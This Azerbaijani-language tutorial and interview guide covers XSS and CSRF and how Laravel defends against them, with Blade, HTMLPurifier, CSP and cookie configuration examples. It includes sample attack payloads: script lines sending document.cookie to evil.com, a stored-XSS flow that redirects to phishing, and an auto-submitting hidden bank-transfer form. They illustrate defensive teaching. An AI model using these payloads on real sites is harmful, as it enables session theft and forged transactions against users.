# XSS and CSRF (Middle ⭐⭐)

## İcmal

XSS (Cross-Site Scripting) — zərərli JavaScript kodunun başqa istifadəçilərin brauzerindən icra edilməsidir. CSRF (Cross-Site Request Forgery) — autentifikasiya olmuş istifadəçinin adından onun xəbəri olmadan hərəkət etdirməkdir. İkisi birlikdə veb tətbiqlərin ən çox rast gəlinən hücum vektorlarından biridir. Laravel hər ikisinə qarşı built-in müdafiə verir, amma nüansları bilmək lazımdır. XSS 2024-cü ildə dünyada ən çox aşkar edilən vulnerability növü olaraq qalır.

## Niyə Vacibdir

XSS session token-ını oğurlaya, istifadəçi adına əməliyyat edə, phishing səhifə göstərə, keylogger yerləşdirə bilər. CSRF istifadəçinin bilmədən bank transferi, şifrə dəyişikliyi, hesab silmə kimi əməliyyatlar etdirə bilər. 2018-ci ildə British Airways breach-i (380.000 müştəri, 20 milyon GBP cərimə) XSS ilə oldu. Bu iki hücum növünü dərindən bilmək hər web developer üçün minimaldır.

## Əsas Anlayışlar

**XSS növləri:**
- **Stored (Persistent) XSS**: Zərərli script DB-yə saxlanır, hər istifadəçi səhifəyə girəndə icra olunur — ən təhlükəlisi. Yorum sahəsi, profil adı, məhsul açıqlaması. `<script>fetch('https://evil.com?c='+document.cookie)</script>`
- **Reflected XSS**: URL-dəki script birbaşa response-da əks olunur — phishing linki ilə paylaşılır. `https://site.com/search?q=<script>alert(1)</script>`. Hücum etmək üçün victim-ə link göndərilir
- **DOM-based XSS**: JavaScript `innerHTML` kimi DOM-u dəyişdirərkən baş verir — server daxili deyil, client-side. `document.getElementById('name').innerHTML = new URLSearchParams(location.search).get('name')` — server log-larda görünmür
- **Mutation XSS (mXSS)**: HTML sanitizer-ın özündə olan zəiflik — sanitize edilmiş HTML DOM-a əlavə edildikdə mutasiya ilə zərərli hala gəlir. DOMPurify bu riskə qarşı çalışır

**XSS müdafiəsi:**
- **Output encoding**: User input-u HTML-ə yazdıqda `<`, `>`, `"`, `'`, `&` xarakterləri HTML entity-ə çevrilməlidir: `&lt;`, `&gt;`, `&quot;`. Laravel `{{ }}` bunu avtomatik edir
- **CSP (Content Security Policy)**: Brauzerin yalnız icazəli mənbələrdən script çalışdırmasını məhdudlaşdırır. `script-src 'self' 'nonce-{random}'` — inline script-lər nonce ilə işarələnməyibsə blok olunur
- **HTTPOnly Cookie**: JavaScript `document.cookie` ilə cookie-ə daxil ola bilmir — XSS zamanı session oğurlanmır. HTTPS üçün `Secure` flag da lazımdır
- **HTML Sanitization**: Trusted HTML content (WYSIWYG editor) üçün HTMLPurifier whitelist yanaşması. `strip_tags()` yetərli deyil — event handler-lar (`onload`, `onerror`) saxlanır
- **Subresource Integrity (SRI)**: CDN-dən yüklənən script-lərin hash-ini yoxlamaq: `<script integrity="sha384-...">`

**CSRF nədir:**
- Başqa sayt user brauzerindən sizin saytınıza request göndərir — autentifikasiya cookie avtomatik əlavə olunur
- `https://evil.com`-dakı gizli form: `POST /bank/transfer` `amount=10000&to=attacker` — browser session cookie-ni avtomatik göndərir
- Victim evil.com-u açanda form submit olunur, bank transfer baş verir — victim heç nə bilmir
- SameSite cookie bu kateqoriyadan olan hücumların əksəriyyətini önləyir

**CSRF müdafiəsi:**
- **CSRF Token (Synchronizer Token Pattern)**: Hər session üçün unikal, gizli, random token. Server hər form submit-da token-i validate edir. Başqa sayt bu token-i bilə bilməz (SOP sayəsində). Laravel `@csrf` directive, `VerifyCsrfToken` middleware
- **SameSite Cookie attribute**: Cookie yalnız eyni saytdan gələn request-lərlə göndərilir. `Strict`: tam qadağan — external link-dən gəldikdə belə göndərilmir. `Lax` (default modern browser-lar): top-level navigation GET-lərinə icazə. `None`: cross-site gönderim, `Secure` ilə birlikdə
- **Double Submit Cookie**: CSRF token-ı həm cookie-yə, həm request header/body-yə əlavə etmək. SPA üçün — backend stateless olduqda (JWT auth)
- **Custom Request Header**: `X-Requested-With: XMLHttpRequest` — simple browser form göndərə bilmir bu header-ı. JavaScript fetch/Axios ilə göndərilən API call-lar üçün yetərli (SPA ilə birlikdə)
- **Origin/Referer header validation**: Köhnə üsul — spoofable ola bilər, etibarlı deyil

**XSS vs CSRF fərqi — vacib:**
- XSS: Başqa istifadəçilərin brauzerini hədəf alır — victim sayta girirsə oğurluq başlayır
- CSRF: Autentifikasiya olmuş istifadəçini hədəf alır — victim başqa sayta girirsə attack başlayır
- XSS müdafiəsi: Output encoding, CSP, HTTPOnly cookie
- CSRF müdafiəsi: CSRF token, SameSite cookie
- XSS var olduqda CSRF token-ı bypass etmək olar (XSS JavaScript-i CSRF token-ı oxuya bilir)

## Praktik Baxış

**Interview-da yanaşma:**
XSS vs CSRF fərqini aydın çəkin: XSS başqa istifadəçilərin brauzerini, CSRF autentifikasiya olmuş istifadəçinin sessiyasını hədəf alır. Laravel-in hər ikisinə qarşı müdafiəsini konkret göstərin. CSP nonce-based implementation-ı bilmək sizi fərqləndirir.

**Follow-up suallar (top companies-da soruşulur):**
- "SPA-da CSRF necə idarə olunur?" → Cookie-based auth + SameSite=Strict: CSRF token lazım deyil. Sanctum SPA: `XSRF-TOKEN` cookie, Axios həmin cookie-dən oxuyub `X-XSRF-TOKEN` header-ı əlavə edir
- "HTTPOnly cookie XSS-dən necə qoruyur?" → `document.cookie` JavaScript-dən gizlənir. XSS olsa belə session cookie oğurlana bilmir — attacker session hijack edə bilmir
- "CSP nonce nədir?" → Hər request-də random nonce generate edilir. Script tag-ına əlavə edilir: `<script nonce="xyz">`. CSP policy-si: `script-src 'nonce-xyz'`. Nonce olmadan heç bir script icra edilmir — inline script XSS mümkünsüzdür
- "Trusted HTML content-i (WYSIWYG editor çıxışını) necə render edərdiniz?" → HTMLPurifier ilə whitelist sanitization. Yalnız `b, i, u, p, a[href], img[src,alt]` kimi safe element-lərə icazə. `script, iframe, onload` kimi event handler-lar silgig edilir
- "SameSite=Strict vs Lax fərqi?" → Strict: login button-u external link-dən click etdikdə session cookie göndərilmir — user login görmür. Lax: Top-level GET navigation-da cookie göndərilir — daha az aggressiv. Lax API üçün Strict-dən daha müştəri dostu
- "XSS olduqda CSRF token necə bypass olunur?" → XSS JavaScript-i `document.querySelector('[name="_token"]').value` ilə CSRF token-ı oxuya bilir, öz request-lərinə əlavə edə bilir. CSP XSS-i önləyərsə bu risk aradan qalxır

**Ümumi səhvlər (candidate-ların etdiyi):**
- `{!! !!}` istifadəsinin XSS açdığını bilməmək — "raw output lazımdır" deyib user datanı render etmək
- CSRF token-sız API endpoint-lər — "API-dir, CSRF lazım deyil" yanlışdır (cookie-based auth varsa)
- `strip_tags()` ilə XSS-i önləməyə çalışmaq — event handler-lar saxlanır
- CSP-ni yalnız `unsafe-inline` ilə konfiqurasiya etmək — demək olar ki, heç bir qoruması yoxdur

**Yaxşı cavabı əla cavabdan fərqləndirən:**
CSP nonce-based implementation-ı bilmək, `SameSite=Strict` cookie-nin CSRF-i necə önlədiyini izah etmək, WYSIWYG content üçün HTMLPurifier whitelist yanaşmasını göstərə bilmək, DOM-based XSS-in server log-larda görünmədiyini izah etmək.

## Nümunələr

### Tipik Interview Sualı

"XSS vs CSRF fərqini izah edin. Laravel-də hər ikisinə qarşı müdafiə necədir?"

### Güclü Cavab

"XSS — zərərli JavaScript-i başqa istifadəçinin brauzerindən icra etmək. Yorum sahəsinə `<script>fetch('https://evil.com?c='+document.cookie)</script>` yazılsa, hər görüntüləyən istifadəçinin cookie-si oğurlanır. Müdafiə: `{{ }}` output encoding, HTTPOnly cookie, CSP.

CSRF — başqa saytdan autentifikasiya olmuş istifadəçinin adına əməliyyat etdirmək. `evil.com`-da gizli form: `POST /account/delete` — victim evil.com-u açdıqda session cookie avtomatik göndərilir, hesab silinir. Müdafiə: CSRF token `@csrf`, SameSite=Strict cookie.

Laravel-də: `{{ }}` avtomatik HTML encode edir. `VerifyCsrfToken` middleware `web` route-larında aktiv. Session cookie HTTPOnly + SameSite. SPA üçün: Sanctum XSRF-TOKEN cookie ilə double-submit pattern."

### Kod/Konfiqurasiya Nümunəsi

```blade
{{-- ============================================================ --}}
{{-- XSS: Laravel template output encoding --}}
{{-- ============================================================ --}}

{{-- ❌ PROBLEM — raw output, XSS açıq --}}
{!! $user->bio !!}
{{-- user bio = "<script>fetch('https://evil.com?c='+document.cookie)</script>"
     Brauzer bu script-i icra edir → session oğurlanır --}}

{{-- ✅ HƏLL — auto HTML encoding --}}
{{ $user->bio }}
{{-- "<script>..." → "&lt;script&gt;..." → Browser script kimi oxumur --}}

{{-- ✅ Trusted HTML (WYSIWYG editor content) — sanitize etdikdən sonra --}}
{!! app(\HTMLPurifier::class)->purify($article->content) !!}
{{-- Yalnız safe HTML-ə icazə, script/event handler-lar silindi --}}
```

```php
// HTMLPurifier konfiqurasiyası — WYSIWYG content
use HTMLPurifier;
use HTMLPurifier_Config;

class HtmlSanitizer
{
    private HTMLPurifier $purifier;

    public function __construct()
    {
        $config = HTMLPurifier_Config::createDefault();

        // Yalnız safe element-lər
        $config->set('HTML.Allowed',
            'h2,h3,h4,p,br,ul,ol,li,strong,em,u,s,a[href|title],img[src|alt|width|height],blockquote,pre,code'
        );

        // Xarici link-lər yeni tabda açılsın
        $config->set('HTML.TargetBlank', true);

        // javascript: URL-lərini blok et
        $config->set('URI.SafeIframeRegexp', '');
        $config->set('URI.AllowedSchemes', ['http' => true, 'https' => true, 'mailto' => true]);

        // Cache
        $config->set('Cache.SerializerPath', storage_path('app/purifier'));

        $this->purifier = new HTMLPurifier($config);
    }

    public function clean(string $dirty): string
    {
        return $this->purifier->purify($dirty);
    }
}
```

```php
// CSRF Token — Laravel Form
// Web routes üçün VerifyCsrfToken middleware avtomatik aktiv

// ✅ Blade form
// <form method="POST" action="/transfer">
//     @csrf  → <input type="hidden" name="_token" value="random_token_here">
//     ...
// </form>

// ✅ SPA — Sanctum XSRF-TOKEN cookie ilə
// Frontend:
// axios.defaults.withCredentials = true;
// GET /sanctum/csrf-cookie → XSRF-TOKEN cookie set olunur
// Sonrakı POST sorğularda Axios cookie-dən oxuyub X-XSRF-TOKEN header-ı əlavə edir

// CSRF exempt — yalnız external webhook endpoint-lər
// app/Http/Middleware/VerifyCsrfToken.php
class VerifyCsrfToken extends Middleware
{
    protected $except = [
        'api/webhooks/*',  // External webhook — CSRF token yoxdur, HMAC signature var
        'api/stripe/*',    // Stripe webhook
    ];
}
```

```php
// Content Security Policy — nonce-based
// app/Http/Middleware/ContentSecurityPolicy.php
class ContentSecurityPolicy
{
    public function handle(Request $request, Closure $next): Response
    {
        $nonce = base64_encode(random_bytes(16)); // Hər request üçün yeni nonce

        // Blade template-lərindən erişmək üçün
        app()->instance('csp_nonce', $nonce);
        view()->share('cspNonce', $nonce);

        $response = $next($request);

        $csp = implode('; ', [
            "default-src 'self'",
            "script-src 'self' 'nonce-{$nonce}'",  // Inline script-lər nonce-lu olmalıdır
            "style-src 'self' 'unsafe-inline'",      // CSS inline stil üçün
            "img-src 'self' data: https:",
            "font-src 'self' https://fonts.gstatic.com",
            "connect-src 'self'",
            "frame-ancestors 'none'",                // Clickjacking qorunması
            "object-src 'none'",
            "base-uri 'self'",
            "form-action 'self'",
            "upgrade-insecure-requests",
            "report-uri /csp-report",
        ]);

        $response->headers->set('Content-Security-Policy', $csp);

        return $response;
    }
}

// Blade template-də nonce istifadəsi:
// <script nonce="{{ $cspNonce }}">
//     // Bu inline script CSP tərəfindən blok edilmir
//     const userId = {{ auth()->id() }};
// </script>

// CSP report endpoint
Route::post('/csp-report', function (Request $request) {
    $report = $request->json()->all();
    Log::channel('security')->warning('CSP Violation', [
        'report'  => $report,
        'ip'      => $request->ip(),
        'user_id' => auth()->id(),
    ]);
    return response()->noContent();
})->withoutMiddleware([VerifyCsrfToken::class]);
```

```php
// Cookie security konfiqurasiyası
// config/session.php
return [
    'http_only'  => true,     // JavaScript daxil ola bilmir → XSS-ə qarşı
    'secure'     => true,     // Yalnız HTTPS üzərindən → MitM-ə qarşı
    'same_site'  => 'strict', // Cross-site request-lərdə göndərilmir → CSRF-ə qarşı
    'encrypt'    => true,     // Laravel-in cookie encryption-ı
    'lifetime'   => 120,      // 2 saat
];
```

```javascript
// DOM-based XSS — JavaScript tərəfdə
// ❌ Problem — innerHTML XSS riski
const name = new URLSearchParams(window.location.search).get('name');
document.getElementById('greeting').innerHTML = `Hello, ${name}!`;
// URL: ?name=<img src=x onerror=alert(document.cookie)>
// → XSS! cookie oğurlanır

// ✅ Həll — textContent (HTML encode edilmir, sadəcə text)
document.getElementById('greeting').textContent = `Hello, ${name}!`;
// URL: ?name=<img src=x onerror=alert(1)>
// → "<img src=x onerror=alert(1)>" text olaraq göstərilir — safe

// ✅ Alternativ — createTextNode
const node = document.createTextNode(`Hello, ${name}!`);
document.getElementById('greeting').appendChild(node);

// React/Vue/Angular: JSX/template-lər default encoding edir
// {name} → React-da auto-encoded, safe
// Yalnız dangerouslySetInnerHTML (React) / v-html (Vue) risk yaradır
```

### Attack/Defense Nümunəsi

```
STORED XSS ATTACK FLOW:

1. Attacker comment sahəsinə yazır:
   "<script>
     fetch('https://evil.com/steal?c=' + document.cookie);
     document.location = 'https://evil.com/phishing';
   </script>"

2. Comment DB-yə saxlanır (server validation yoxdur)

3. Hər user bu comment-i görəndə:
   - Script icra edilir
   - Session cookie evil.com-a göndərilir
   - User phishing sayta yönləndirilir

DEFENSE:
   // Server-side: {{ $comment->content }} → HTML encoded
   // "&lt;script&gt;fetch(...)" → Browser script kimi oxumur
   // CSP: script-src 'nonce-xyz' → Nonce olmayan inline script blok

CSRF ATTACK FLOW:

1. Victim bank saytına giriş edir (session cookie var)

2. Attacker victim-ə phishing email göndərir:
   "Şəklin bax: https://evil.com/funny.html"

3. evil.com/funny.html-i açanda:
   <html>
   <body onload="document.getElementById('f').submit()">
     <form id="f" action="https://bank.com/transfer" method="POST">
       <input name="amount" value="10000">
       <input name="to" value="attacker_account">
     </form>
   </body>
   </html>

4. Browser bank.com-un session cookie-sini avtomatik əlavə edir
   Bank transfer baş verir — victim heç nə bilmir

DEFENSE:
   1. CSRF token: Bank form-da gizli token, evil.com bilmir → token mismatch → 419
   2. SameSite=Strict: external saytdan gələn request-də cookie göndərilmir → auth olmur → 401
   3. Origin header yoxlaması (əlavə qoruma)
```

## Praktik Tapşırıqlar

1. Codebase-inizdə `{!! !!}` istifadəsini grep edin — hər biri üçün risk analizi aparın, HTMLPurifier lazımdırmı?
2. CSRF exempt route-ların siyahısına baxın — bunlar doğru mu? Webhook-lar HMAC ile qorunurmu?
3. CSP header yaradın, Chrome DevTools Console-da violation-ları izləyin — nə blok olunur?
4. `SameSite=Strict` cookie-ni aktiv edib Postman ilə cross-origin request test edin — blok olunurmu?
5. Stored XSS test: comment field-ına `<script>alert(document.cookie)</script>` daxil edin, `{{ }}` ilə render edildikdə nə olur?
6. DOM-based XSS: URL query parametrini `innerHTML`-ə write edən bir snippet yazıb exploit edin, sonra `textContent` ilə fix edin
7. HTMLPurifier-ı konfiqurasiya edib `<img onerror=alert(1) src=x>` sanitize etməsini test edin

## Əlaqəli Mövzular

- `01-owasp-top-10.md` — A03 XSS, A01 CSRF konteksti
- `10-security-headers.md` — CSP, X-Frame-Options, X-Content-Type-Options dərinliyi
- `09-input-validation.md` — Input sanitization, whitelist yanaşması
- `04-authentication-authorization.md` — Session security, HTTPOnly cookie, SameSite
